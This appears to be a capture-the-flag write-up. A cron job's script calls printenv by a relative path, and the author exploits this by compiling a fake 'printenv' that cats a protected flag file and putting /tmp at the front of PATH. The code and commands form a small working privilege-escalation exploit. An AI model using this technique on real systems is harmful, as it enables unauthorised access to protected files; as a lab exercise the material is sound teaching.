We started by exploring the directory.

![alt text](img/Screenshot%202022-12-12%20at%2012.09.51.JPG)

In the ```my_script.sh``` file, we see a relative path, that can be exploited.

We change our directory, check ```last_log```, and find out the cron job has access to flag.txt, so we redirect the calling of the function printenv to our malicious code:

```C
#include <stdio.h>
#include <stdlib.h>

int main(){
    system("cat /flags/flag.txt"); 
}
```

We compile the code with ```gcc flag.c -o printenv```. 

After that, we create an env file to change the PATH environment variable with the following content:

```export PATH="/tmp/:/command:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"```

Finally, we open ```last_log``` to get our flag.

![alt text](img/Screenshot%202022-12-14%20at%2017.33.46.JPG)